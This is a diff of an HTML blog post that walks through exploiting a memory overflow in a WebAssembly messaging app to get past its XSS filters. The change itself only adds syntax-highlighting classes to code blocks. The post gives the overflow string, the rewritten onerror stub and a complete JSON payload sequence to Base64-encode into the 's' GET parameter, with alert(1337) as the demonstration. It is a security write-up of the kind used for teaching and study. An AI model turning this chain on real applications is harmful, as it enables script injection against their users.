@@ -1057,7 +1057,7 @@ VM1601:49 Found "<article><p>%.*s</p></article>" at memory address: 65581</code>
             </p>
             <h5 class='sidetext'>The Overflow Payload</h5>
             <p>To overwrite the first message pointer, we edit the last (11th) message with this payload:</p>
-            <pre><code>"aaaaaaaaaaaaaaaa.\u0000\u0001\u0000\u0050"</code></pre>
+            <pre><code class="language-javascript">"aaaaaaaaaaaaaaaa.\u0000\u0001\u0000\u0050"</code></pre>
             <p>Why Unicode escapes?</p>
             <ul>
                 <li>JavaScript strings only support Unicode text safely.</li>
@@ -1069,7 +1069,7 @@ VM1601:49 Found "<article><p>%.*s</p></article>" at memory address: 65581</code>
             <p>
                 Once that’s done, we edit the first message and replace its content with:
             </p>
-            <pre><code>"img src=1      onerror=%.*s "</code></pre>
+            <pre><code class="language-javascript">"img src=1      onerror=%.*s "</code></pre>
             <p>
                 At this point, the HTML stub in WASM memory has been surgically modified.
             </p>
@@ -1077,7 +1077,7 @@ VM1601:49 Found "<article><p>%.*s</p></article>" at memory address: 65581</code>
             <p>
                 Now, sending a new message with <code>alert(1337)</code> should inject:
             </p>
-            <pre><code>&lt;img src=1 onerror=alert(1337)&gt;</code></pre>
+            <pre><code class="language-javascript">&lt;img src=1 onerror=alert(1337)&gt;</code></pre>
             <p><strong>Boom.</strong></p>
             <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/exp.png' | relative_url }}" 
             alt="Screenshot showing message characters in DevTools" class="code-screenshot" />
@@ -1090,7 +1090,7 @@ VM1601:49 Found "<article><p>%.*s</p></article>" at memory address: 65581</code>
                 <li>Watch your payload execute, bypassing all filters.</li>
             </ul>
             <p>The payload structure:</p>
-            <pre><code>[{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"edit","msgId":10,"content":"aaaaaaaaaaaaaaaa.\u0000\u0001\u0000\u0050","time":1756885686080},{"action":"edit","msgId":0,"content":"img src=1      onerror=%.*s ","time":1756885686080},{"action":"add","content":"alert(1337)","time":1756840476392}]</code></pre>
+            <pre><code class="language-javascript">[{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"edit","msgId":10,"content":"aaaaaaaaaaaaaaaa.\u0000\u0001\u0000\u0050","time":1756885686080},{"action":"edit","msgId":0,"content":"img src=1      onerror=%.*s ","time":1756885686080},{"action":"add","content":"alert(1337)","time":1756840476392}]</code></pre>
             <p>
                 Finally, encode the entire payload in Base64 and pass it to the application as the 
                 <code>s</code> GET parameter.
